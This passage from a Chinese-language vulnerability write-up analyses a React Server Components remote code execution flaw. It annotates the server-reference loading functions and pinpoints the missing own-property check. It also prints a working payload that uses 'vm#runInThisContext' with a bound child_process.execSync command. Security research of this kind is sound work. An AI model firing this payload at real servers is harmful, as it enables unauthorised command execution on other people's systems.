</h3><p>中间函数：loadServerReference()，它是「服务端引用标识（ Action ID）」到「实际可执行的服务端函数」的桥梁 —— 客户端发起 Server Actions 请求时，仅传递 Action ID 等轻量标识，而该函数负责根据标识找到并加载对应的服务端函数。</p>
<p>来看代码，添加注释后如下；</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">* 加载服务端引用（Server Reference）对应的函数：根据 Action ID 解析并加载服务端注册的函数，支持绑定预设参数（bound），实现 Server Actions 函数实例化
</span></span></span><span class="line"><span class="cl"><span class="cm">*
</span></span></span><span class="line"><span class="cl"><span class="cm">* @param {Object} bundlerConfig - 构建工具配置，包含服务端模块/Action 的映射关系
</span></span></span><span class="line"><span class="cl"><span class="cm">* @param {string} id - 服务端引用的唯一标识，如 Action ID，可由客户端请求传入
</span></span></span><span class="line"><span class="cl"><span class="cm">* @param {Array|null} bound - 可选的绑定参数数组，用于给服务端函数预设入参（如组件上下文、元数据）
</span></span></span><span class="line"><span class="cl"><span class="cm">* @returns {Promise&lt;Function&gt;} - 解析后的服务端函数（Promise 形式），若有bound则返回绑定参数后的函数
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">loadServerReference</span><span class="p">(</span><span class="nx">bundlerConfig</span><span class="p">,</span> <span class="nx">id</span><span class="p">,</span> <span class="nx">bound</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 1. 根据ID和构建配置解析出完整的服务端引用信息（如模块路径、函数名）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// 【安全风险】：若id可控且未校验，可能解析到恶意模块路径,如 vm#runInThisContext
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kd">var</span> <span class="nx">serverReference</span> <span class="o">=</span> <span class="nx">resolveServerReference</span><span class="p">(</span><span class="nx">bundlerConfig</span><span class="p">,</span> <span class="nx">id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 2. 预加载服务端引用对应的模块
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">bundlerConfig</span> <span class="o">=</span> <span class="nx">preloadModule</span><span class="p">(</span><span class="nx">serverReference</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 分支1：存在绑定参数（bound）- 需先解析bound和预加载模块，再绑定参数到函数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">return</span> <span class="nx">bound</span>
</span></span><span class="line"><span class="cl">    <span class="o">?</span> <span class="nb">Promise</span><span class="p">.</span><span class="nx">all</span><span class="p">([</span><span class="nx">bound</span><span class="p">,</span> <span class="nx">bundlerConfig</span><span class="p">]).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">_ref</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">_ref</span> <span class="o">=</span> <span class="nx">_ref</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 加载服务端引用对应的实际函数（核心：从模块中require出目标函数）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">var</span> <span class="nx">fn</span> <span class="o">=</span> <span class="nx">requireModule</span><span class="p">(</span><span class="nx">serverReference</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 将bound参数绑定到函数（bind），第一个参数为this（设为null），后续拼接bound数组 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// 【核心】：最终返回的函数执行时会自动带上bound预设参数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="nx">fn</span><span class="p">.</span><span class="nx">bind</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="nx">fn</span><span class="p">,</span> <span class="p">[</span><span class="kc">null</span><span class="p">].</span><span class="nx">concat</span><span class="p">(</span><span class="nx">_ref</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">      <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 分支2：无绑定参数，但预加载模块存在 - 等待模块预加载完成后加载函数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">:</span> <span class="nx">bundlerConfig</span>
</span></span><span class="line"><span class="cl">      <span class="o">?</span> <span class="nb">Promise</span><span class="p">.</span><span class="nx">resolve</span><span class="p">(</span><span class="nx">bundlerConfig</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">return</span> <span class="nx">requireModule</span><span class="p">(</span><span class="nx">serverReference</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 分支3：无绑定参数且无预加载模块 - 直接加载服务端函数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="o">:</span> <span class="nb">Promise</span><span class="p">.</span><span class="nx">resolve</span><span class="p">(</span><span class="nx">requireModule</span><span class="p">(</span><span class="nx">serverReference</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>关键点：</p>
<ul>
<li>调用 resolveServerReference 解析模块ID</li>
<li>调用 requireModule 获取函数</li>
<li>使用 <code>fn.bind.apply</code> 绑定 bound 数组作为参数</li>
</ul>
<p>业务价值：支撑 RSC Server Actions 的「参数绑定」和「模块懒加载」能力，让服务端函数可以携带上下文（如组件元数据、用户会话）执行，同时保证模块加载的异步性。</p>
<p><strong>核心风险点</strong>：</p>
<ul>
<li><code>id</code> 参数用户可控且未做白名单校验，可能被篡改指向恶意模块路径（<code>vm#runInThisContext</code>），通过 <code>requireModule</code> 加载并执行恶意代码；</li>
<li><code>bound</code> 参数若未过滤，可能传入恶意参数数组，通过 <code>fn.bind</code> 篡改函数执行上下文或入参，触发非预期行为。</li>
</ul>
<h3 id="resolveserverreference" class="heading-element"><span>resolveServerReference</span>
  <a href="#resolveserverreference" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>解析函数：resolveServerReference，是 <strong>Server Reference 解析的核心入口</strong>，也是 Server Actions / 服务端组件模块查找的基础</p>
<p>它是「抽象的服务端引用 ID」到「具体的模块元数据」的转换器 ——RSC 中客户端仅传递精简的 ID（如 <code>vm#runInThisContext</code>），该函数负责从服务端预编译的 <code>Server Manifest</code>（<code>bundlerConfig</code>）中，找到 ID 对应的模块信息，为后续加载模块、执行函数提供依据。</p>
<p>注释后代码如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">* 解析 Server Reference ID（服务端引用标识）：根据服务端清单（bundlerConfig）和 Action ID，解析出对应的服务端模块元数据，并返回标准化的服务端引用数组
</span></span></span><span class="line"><span class="cl"><span class="cm">*
</span></span></span><span class="line"><span class="cl"><span class="cm">* @param {Object} bundlerConfig - 服务端清单 Manifest，key为Module/Action ID，value为模块元数据（包含id、chunks、name、async等字段）
</span></span></span><span class="line"><span class="cl"><span class="cm">* @param {string} id - 待解析的服务端引用唯一标识（如 Action ID/模块ID，可能带#分割的函数名）
</span></span></span><span class="line"><span class="cl"><span class="cm">* @returns {Array} - 标准化的服务端引用数组，格式：[模块ID, 关联的chunk列表, 函数名, 异步标识(可选)]
</span></span></span><span class="line"><span class="cl"><span class="cm">* @throws {Error} - 若未找到匹配的模块，抛出错误
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">resolveServerReference</span><span class="p">(</span><span class="nx">bundlerConfig</span><span class="p">,</span> <span class="nx">id</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">name</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 第一步：从服务端清单中直接匹配ID对应的模块元数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">resolvedModuleData</span> <span class="o">=</span> <span class="nx">bundlerConfig</span><span class="p">[</span><span class="nx">id</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 分支1：ID直接匹配到模块元数据，提取模块元数据中的函数/Action名称
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nx">resolvedModuleData</span><span class="p">)</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">resolvedModuleData</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 分支2：ID未直接匹配，尝试解析带#分割的复合ID（如 vm#runInThisContext）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">idx</span> <span class="o">=</span> <span class="nx">id</span><span class="p">.</span><span class="nx">lastIndexOf</span><span class="p">(</span><span class="s2">&#34;#&#34;</span><span class="p">);</span>  <span class="c1">// 找到ID中分割模块ID和函数的位置（最后一个#位置）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 若存在#分隔符，拆分模块ID和函数名
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">-</span><span class="mi">1</span> <span class="o">!==</span> <span class="nx">idx</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 提取#后的部分作为函数/Action名称
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">((</span><span class="nx">name</span> <span class="o">=</span> <span class="nx">id</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">idx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 提取#前的部分作为模块ID，重新从清单中匹配模块元数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">(</span><span class="nx">resolvedModuleData</span> <span class="o">=</span> <span class="nx">bundlerConfig</span><span class="p">[</span><span class="nx">id</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">idx</span><span class="p">)]));</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 若拆分后仍未匹配到模块元数据，抛出致命错误
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">resolvedModuleData</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">throw</span> <span class="nb">Error</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="err">……</span>
</span></span><span class="line"><span class="cl">      <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 第二步：返回标准化的服务端引用数组（区分异步/同步模块） 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// 异步模块：追加第4个元素（1）标识异步；同步模块：仅返回前3个元素
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">return</span> <span class="nx">resolvedModuleData</span><span class="p">.</span><span class="kr">async</span>
</span></span><span class="line"><span class="cl">    <span class="o">?</span> <span class="p">[</span><span class="nx">resolvedModuleData</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="nx">resolvedModuleData</span><span class="p">.</span><span class="nx">chunks</span><span class="p">,</span> <span class="nx">name</span><span class="p">,</span> <span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="p">[</span><span class="nx">resolvedModuleData</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="nx">resolvedModuleData</span><span class="p">.</span><span class="nx">chunks</span><span class="p">,</span> <span class="nx">name</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>关键点：</p>
<ul>
<li>使用 <code>#</code> 分割 ID，例如 <code>vm#runInThisContext</code> → <code>模块=vm, 名称=runInThisContext</code></li>
<li>返回数组 <code>[moduleId, chunks, exportName]</code> → 这就是 metadata</li>
</ul>
<p>这里的返回基本就是：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[vm,[&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString()&#34;],runInThisContext]</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="requiremodule" class="heading-element"><span>requireModule</span>
  <a href="#requiremodule" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>漏洞函数：requireModule 该函数是 React RSC 中 <strong>服务端模块加载的最终执行层</strong>，也是 Server Actions 从「模块加载」到「函数获取」的最后一环</p>
<p>通过 webpack 内置的 <code>__webpack_require__</code> 加载编译后的服务端模块，再根据 RSC 约定的规则解析出目标导出项（如 Server Actions 对应的具体函数），是服务端模块从「加载」到「可用」的核心转换步骤。</p>
<p>注释后代码如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">* 加载服务端模块并解析目标导出项：根据 resolveServerReference 返回的标准化模块元数据，
</span></span></span><span class="line"><span class="cl"><span class="cm">* 通过 webpack 运行时加载模块，并按规则解析出目标函数/导出项（如 Server Actions 函数）
</span></span></span><span class="line"><span class="cl"><span class="cm">*
</span></span></span><span class="line"><span class="cl"><span class="cm">* @param {Array} metadata - 标准化的服务端模块元数据（来自 resolveServerReference），格式：[模块ID, chunk列表, 目标导出名, 异步标识(可选)]
</span></span></span><span class="line"><span class="cl"><span class="cm">* @returns {any} - 模块的目标导出项（函数/对象/默认导出等），Server Actions 的实际执行函数 
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">requireModule</span><span class="p">(</span><span class="nx">metadata</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 第一步：通过 webpack 运行时加载模块，metadata[0]=模块ID，是 webpack 打包后模块的唯一标识
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kd">var</span> <span class="nx">moduleExports</span> <span class="o">=</span> <span class="nx">__webpack_require__</span><span class="p">(</span><span class="nx">metadata</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 第二步：处理异步模块（metadata长度为4表示异步模块）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="mi">4</span> <span class="o">===</span> <span class="nx">metadata</span><span class="p">.</span><span class="nx">length</span> <span class="o">&amp;&amp;</span> <span class="s2">&#34;function&#34;</span> <span class="o">===</span> <span class="k">typeof</span> <span class="nx">moduleExports</span><span class="p">.</span><span class="nx">then</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 异步模块已完成加载（状态为fulfilled）：提取实际的模块导出值
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="s2">&#34;fulfilled&#34;</span> <span class="o">===</span> <span class="nx">moduleExports</span><span class="p">.</span><span class="nx">status</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nx">moduleExports</span> <span class="o">=</span> <span class="nx">moduleExports</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">throw</span> <span class="nx">moduleExports</span><span class="p">.</span><span class="nx">reason</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 第三步：根据 metadata[2]（目标导出名）解析模块的具体导出项（核心分支逻辑）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">return</span> <span class="s2">&#34;*&#34;</span> <span class="o">===</span> <span class="nx">metadata</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 分支1：导出名为&#34;*&#34; → 返回整个模块的导出对象（导出全部）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">?</span> <span class="nx">moduleExports</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="s2">&#34;&#34;</span> <span class="o">===</span> <span class="nx">metadata</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 分支2：导出名为空 → 优先取ES模块的default默认导出，非ES模块则返回整个模块
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="o">?</span> <span class="nx">moduleExports</span><span class="p">.</span><span class="nx">__esModule</span>
</span></span><span class="line"><span class="cl">        <span class="o">?</span> <span class="nx">moduleExports</span><span class="p">.</span><span class="k">default</span>
</span></span><span class="line"><span class="cl">        <span class="o">:</span> <span class="nx">moduleExports</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 分支3：指定具体导出名 → 取模块的对应命名导出（如 Server Actions 函数名）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="o">:</span> <span class="nx">moduleExports</span><span class="p">[</span><span class="nx">metadata</span><span class="p">[</span><span class="mi">2</span><span class="p">]];</span>  
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>漏洞在这行：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">:</span> <span class="nx">moduleExports</span><span class="p">[</span><span class="nx">metadata</span><span class="p">[</span><span class="mi">2</span><span class="p">]];</span>  <span class="c1">// ❌ 没有 hasOwnProperty 检查！访问了原型链！
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>可以看到，moduleExports有 <code>child_process</code> 的所有函数，并且<code>metadata[2]</code>是我们控制的，也就意味着我们可以调用这个模块下所有函数（而非serverManifest定义的）</p>
<p><a class="lightgallery" href="/posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20251212094100821.png?size=large" data-thumbnail="/posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20251212094100821.png?size=small" data-sub-html="<h2>img</h2>"><img loading="lazy" src="/posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20251212094100821.png" alt="img" srcset="/posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20251212094100821.png?size=small, /posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20251212094100821.png?size=medium 1.5x, /posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20251212094100821.png?size=large 2x" data-title="img" style="--width: 2442px;--aspect-ratio: 2442 / 750;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h3 id="vmruninnewcontext" class="heading-element"><span>vm#runInNewContext</span>
  <a href="#vmruninnewcontext" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>VM模块在很早的时候就有人用它来执行代码，只不过现在才结合起来组合造成rce。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">id</span><span class="o">:</span> <span class="s2">&#34;vm#runInThisContext&#34;</span><span class="p">,</span>  
</span></span><span class="line"><span class="cl"><span class="nx">bound</span><span class="o">:</span> <span class="p">[</span>  
</span></span><span class="line"><span class="cl"><span class="s2">&#34;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString()&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span></span></span></code></pre></td></tr></table>
</div>
</div><p>这个请求会：</p>
<ol>
<li>加载 <code>vm</code> 模块，访问 <code>vm.runInThisContext</code> 方法</li>
<li>将攻击者的代码作为参数绑定</li>
<li>执行时运行 <code>execSync('id')</code>，实现命令执行</li>
</ol>
<p><code>global.process</code>：全局对象中获取了进程的process对象</p>
<p><code>global.process.mainModule</code>：当前程序的入口模块，通过require 导入 fs、path、net、http、child_process这些模块都可以，采用child_process 进行命令执行权限比较高。</p>
<p>上面我们就获得了一个反序列化出一个服务器函数带有命令的，而后 server.js 下面部分会执行服务器Action函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">    <span class="c1">// 5. 执行Action函数并返回结果
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">actionFn</span> <span class="o">===</span> <span class="s1">&#39;function&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 模拟 “正常业务 action 调用”
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">result</span> <span class="o">=</span> <span class="nx">actionFn</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">result</span> <span class="o">=</span> <span class="nx">actionFn</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>判断actionFn是否是函数，如果是就调用执行这个actionFn函数，正常情况下是会传入正常业务的参数的，但这里已经不重要了，最后执行出来是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">vm</span><span class="p">.</span><span class="nx">runInThisContext</span><span class="p">(</span><span class="s2">&#34;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;)&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
</div>
</div><p>因此回顾一下整体流程是：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
